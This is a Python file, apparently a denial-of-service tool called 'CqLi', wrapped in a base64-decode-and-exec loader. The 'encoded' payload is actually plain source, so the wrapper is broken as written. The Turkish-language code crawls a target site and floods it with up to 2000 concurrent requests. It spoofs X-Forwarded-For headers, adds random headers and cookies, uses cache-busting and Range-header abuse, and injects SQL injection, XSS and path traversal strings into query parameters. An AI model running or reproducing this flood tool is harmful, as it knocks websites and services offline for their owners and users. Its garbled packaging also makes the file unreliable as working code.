import base64
import execnet


encoded_code = 'import aiohttp
import asyncio
import random
import sys
import time
import ssl
from urllib.parse import urljoin, urlparse, urlencode
from bs4 import BeautifulSoup
from tqdm import tqdm
from rich.console import Console
from rich.table import Table
import string
from faker import Faker

# --- KURULUM ---
console = Console()
fake = Faker()
ASCII_ART = """
                   ...
                 ;::::;   CqLi v0.1
               ;::::; :;    Anonymous
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;           OOO\\
           ::::::;       ;          OOOOO\\
           ;:::::;       ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:`:::::::`;:::::: ;::::::#/               DOO
     :::`:::::::`;; ;:::::::::##                OO
     ::::`:::::::`;::::::::;:::#                OO
     `:::::`::::::::::::;'`:;::#                O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#
       Bot>15.665,41
"""

# --- AYARLAR ---
MIN_CONCURRENT_REQUESTS = 50
MAX_CONCURRENT_REQUESTS = 2000
DELAY_BETWEEN_REQUESTS = 0.01
MAX_CRAWL_URLS = 300
MAX_RETRIES = 3
REQUEST_TIMEOUT = 15


request_stats = {'total': 0, 'success': 0, 'failed': 0, 'status_codes': {}, 'response_times': []}


def load_file_lines(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        console.print(f"[bold red]Hata: '{filename}' dosyası bulunamadı. Script sonlandırılıyor.[/bold red]")
        sys.exit(1)
    except Exception as e:
        console.print(f"[bold red]Hata: '{filename}' dosyası okunurken bir sorun oluştu: {e}[/bold red]")
        sys.exit(1)

REFERERS = load_file_lines('referans.txt')
USER_AGENTS = load_file_lines('useragent.txt')


def get_random_headers():
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS) if USER_AGENTS else fake.user_agent(),
        'Referer': random.choice(REFERERS) if REFERERS else fake.url(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'X-Forwarded-For': fake.ipv4()
    }
    for _ in range(random.randint(10, 20)):
        key = f'X-Custom-{"".join(random.choices(string.ascii_lowercase, k=10))}'
        value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(20, 100)))
        headers[key] = value
    if random.random() < 0.2:
        headers['Content-Length'] = str(random.randint(1024, 1024 * 1024))
    cookies = [f'session_{i}={fake.uuid4()}' for i in range(random.randint(3, 8))]
    headers['Cookie'] = '; '.join(cookies)
    return headers

def get_legitimate_looking_headers():
    
    common_user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0'
    ]
    headers = {
        'User-Agent': random.choice(common_user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers'
    }
    return headers

def get_range_abuse_headers():
    
    headers = get_legitimate_looking_headers()
    ranges = []
    # 0-5000 byte aralığında 200 adet rastgele 1 byte'lık parça iste
    for _ in range(900):
        start = random.randint(0, 5000)
        ranges.append(f"{start}-{start+1}")
    headers['Range'] = f"bytes={','.join(ranges)}"
    return headers


def generate_malicious_looking_url(url):
    
    payloads = [
        "' OR 1=1 --", "<script>alert('XSS')</script>", "../../../../etc/passwd",
        "SELECT * FROM users", "UNION SELECT null,null,null", "javascript:void(0)"
    ]
    
    params = {}
    param_name = random.choice(['id', 'user', 'page', 'search', 'file'])
    param_values = [str(random.randint(1, 1000)) for _ in range(random.randint(2, 5))]
    
    if random.random() < 0.5:
        inject_param_name = random.choice(['q', 'query', 'keyword', 'view'])
        params[inject_param_name] = random.choice(payloads)

    query_string = urlencode([(param_name, v) for v in param_values], doseq=True)
    if params:
        query_string += f"&{urlencode(params)}"
    
    if '?' in url:
        return f"{url}&{query_string}"
    else:
        return f"{url}?{query_string}"


async def crawl_urls(session, base_url):
    visited_urls = set()
    urls_to_crawl = asyncio.Queue()
    await urls_to_crawl.put(base_url)
    found_urls = {base_url}
    console.print(f"[cyan]Botlar hedefe aktarılıyor: {base_url}[/cyan]")
    while not urls_to_crawl.empty() and len(found_urls) < MAX_CRAWL_URLS:
        url = await urls_to_crawl.get()
        if url in visited_urls:
            continue
        visited_urls.add(url)
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                if response.status == 200 and 'text/html' in response.headers.get('Content-Type', ''):
                    text = await response.text()
                    soup = BeautifulSoup(text, 'html.parser')
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urljoin(base_url, href)
                        if urlparse(full_url).netloc == urlparse(base_url).netloc and full_url not in found_urls:
                            found_urls.add(full_url)
                            await urls_to_crawl.put(full_url)
                            if len(found_urls) >= MAX_CRAWL_URLS:
                                break
        except (aiohttp.ClientError, asyncio.TimeoutError, Exception):
            continue
    console.print(f"[green]{len(found_urls)} adet saldırılabilecek bot bulundu.[/green]")
    return list(found_urls)

async def send_request(session, url, headers, pbar):
    for attempt in range(MAX_RETRIES):
        try:
            start_time = time.time()
            async with session.get(url, headers=headers, timeout=REQUEST_TIMEOUT, allow_redirects=False) as response:
                await response.read()
                status = response.status
            response_time = (time.time() - start_time) * 1000
            
            request_stats['total'] += 1
            request_stats['status_codes'][status] = request_stats['status_codes'].get(status, 0) + 1
            request_stats['response_times'].append(response_time)
            
            if 200 <= status < 400:
                request_stats['success'] += 1
            else:
                request_stats['failed'] += 1
                if status in [429, 502, 503, 504]:
                    console.print(f"[yellow]Uyarı: Sunucu yavaşlama belirtisi gösteriyor (Durum Kodu: {status}).[/yellow]")
            
            pbar.update(1)
            return

        except (aiohttp.ClientError, asyncio.TimeoutError):
            if attempt + 1 == MAX_RETRIES:
                request_stats['total'] += 1
                request_stats['failed'] += 1
                pbar.update(1)
            await asyncio.sleep(1)
        except Exception:
            if attempt + 1 == MAX_RETRIES:
                request_stats['total'] += 1
                request_stats['failed'] += 1
                pbar.update(1)
            break

def print_summary():
    table = Table(title="Test Özeti")
    table.add_column("Metrik", style="cyan", justify="right")
    table.add_column("Değer", style="magenta")
    table.add_row("Toplam İstek", str(request_stats['total']))
    table.add_row("Başarılı İstek", f"[green]{request_stats['success']}[/green]")
    table.add_row("Başarısız İstek", f"[red]{request_stats['failed']}[/red]")
    if request_stats['response_times']:
        avg_time = sum(request_stats['response_times']) / len(request_stats['response_times'])
        max_time = max(request_stats['response_times'])
        min_time = min(request_stats['response_times'])
        table.add_row("Ortalama Yanıt Süresi (ms)", f"{avg_time:.2f}")
        table.add_row("Maksimum Yanıt Süresi (ms)", f"{max_time:.2f}")
        table.add_row("Minimum Yanıt Süresi (ms)", f"{min_time:.2f}")
    console.print("\n")
    console.print(table)
    
    status_table = Table(title="Durum Kodu Dağılımı")
    status_table.add_column("Durum Kodu", style="cyan")
    status_table.add_column("Sayı", style="magenta")
    for status, count in sorted(request_stats['status_codes'].items()):
        status_table.add_row(str(status), str(count))
    console.print(status_table)


async def flood_test(target_url, concurrent_requests):
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(limit_per_host=concurrent_requests, ssl=ssl_context, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        urls = await crawl_urls(session, target_url)
        if not urls:
            urls = [target_url]
        console.print(f"[bold green]Saldırı Başlıyor...[/bold green]")
        console.print(f"Hedef: {target_url}")
        console.print(f"Eşzamanlı İstek Sayısı: {concurrent_requests}")
        console.print("Durdurmak için Ctrl+C tuşlarına basın.")
        semaphore = asyncio.Semaphore(concurrent_requests)
        try:
            with tqdm(total=None, desc="Gönderilen İstekler", unit="istek", colour="cyan") as pbar:
                while True:
                    async with semaphore:
                        strategy = random.choice(['legitimate', 'chaotic', 'cache_bust', 'hpp_payload', 'range_abuse'])
                        
                        target_url_final = random.choice(urls)
                        headers = {}

                        if strategy == 'legitimate':
                            headers = get_legitimate_looking_headers()
                        
                        elif strategy == 'chaotic':
                            headers = get_random_headers()
                        
                        elif strategy == 'cache_bust':
                            headers = get_random_headers()
                            cache_buster = f"cb={''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}"
                            if '?' in target_url_final:
                                target_url_final = f"{target_url_final}&{cache_buster}"
                            else:
                                target_url_final = f"{target_url_final}?{cache_buster}"
                        
                        elif strategy == 'hpp_payload':
                            headers = get_legitimate_looking_headers()
                            target_url_final = generate_malicious_looking_url(target_url_final)

                        elif strategy == 'range_abuse':
                            headers = get_range_abuse_headers()
                        
                        task = asyncio.create_task(send_request(session, target_url_final, headers, pbar))
                    await asyncio.sleep(DELAY_BETWEEN_REQUESTS)
        except KeyboardInterrupt:
            console.print("\n[bold yellow]Saldırı kullanıcı tarafından durduruldu.[/bold yellow]")
        except Exception as e:
            console.print(f"\n[bold red]Beklenmedik bir hata oluştu: {e}[/bold red]")
        finally:
            print_summary()

async def main():
    console.print(f"[bold cyan]{ASCII_ART}[/bold cyan]")
    target_url = console.input("[bold]Hedef URL'yi girin (örn: http://test.com veya https://test.com): [/bold]").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        console.print("[red]Hata: URL 'http://' veya 'https://' ile başlamalıdır.[/red]")
        return
    try:
        concurrent_reqs = int(console.input(f"[bold]Eşzamanlı istek sayısını girin ({MIN_CONCURRENT_REQUESTS}-{MAX_CONCURRENT_REQUESTS}): [/bold]").strip())
        if not (MIN_CONCURRENT_REQUESTS <= concurrent_reqs <= MAX_CONCURRENT_REQUESTS):
            console.print(f"[red]Hata: Eşzamanlı istek sayısı {MIN_CONCURRENT_REQUESTS} ile {MAX_CONCURRENT_REQUESTS} arasında olmalıdır.[/red]")
            return
    except ValueError:
        console.print("[red]Hata: Lütfen geçerli bir sayı girin.[/red]")
        return
    await flood_test(target_url, concurrent_reqs)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[yellow]CqLi sonlandırıldı.[/yellow]")'


decoded_code = base64.b64decode(encoded_code).decode('utf-8')
exec(decoded_code)
